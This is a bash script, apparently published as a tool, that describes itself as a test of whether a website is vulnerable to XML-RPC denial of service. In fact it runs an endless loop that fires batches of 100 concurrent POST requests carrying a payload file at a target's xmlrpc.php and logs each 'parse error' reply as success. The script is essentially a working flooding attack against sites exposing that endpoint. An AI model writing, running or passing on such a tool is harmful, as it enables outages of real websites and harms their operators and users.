#!/usr/bin/env bash
#
# A script that can determine whether a website is vulnerable to xmlrpc DOS.
# https://github.com/ezekielj20/xmlrpc_php_DOS
# Speed up script by not using unicode
LC_ALL=C
LANG=C

# Color definition
: "${slateBlue:=\e[38;5;61m}"
: "${green:=\e[38;5;002m}"
: "${red:=\e[38;5;001m}"
: "${reset:=\e[m}"

# Global variable limit
limit=100

# Trap (ctrl + c)
trap "printf '\e[K\r-- EXIT\n\n'; exit" INT

# Banner
banner() {
  if command -v figlet >/dev/null 2>&1; then
    printf "%b\n" "${slateBlue}$(figlet XMLRPC_PDOS)${reset}"
  else
    printf "%b\n" "${slateBlue}XMLRPC_DOS${reset}"
  fi
  # Right-align "created by paclab"
  printf "%b\n" "$(printf '%*s' "$(tput cols)" "${green}created by paclab${reset}")"
}

# Usage
usage() { printf "%s\n" "\
Usage: ./xmlrpc_php_DOS.sh <url>
(e.g. 'https://<url>' or 'http://<url>')"
}

# Send packet
send_packet() {
    if [[ $(curl -s -k -i -X POST "${1}/xmlrpc.php" \
                       -H "Content-Type: text/html" \
                       --data-binary "@payload.txt") =~ "parse error" ]]; then
        printf "%b\n" \
        "[$(date +%H:%M:%S)] [${green}SUCCESS${reset}] [INF] packet sended to ${1}"
    else
        printf "%b\n" \
        "[$(date +%H:%M:%S)] [${red}FAILED${reset}] [INF] maybe down or not vuln."
    fi
}

# Logic
[[ ${#@} -gt 0 ]] && {
    [[ ${1} =~ ^https?:\/\/ ]] && {
        clear
        banner
        while :; do
            ((x=x%limit)); ((x++==0)) && wait
                send_packet ${1} &
        done
    } || {
        usage
    }
} || {
    usage
}

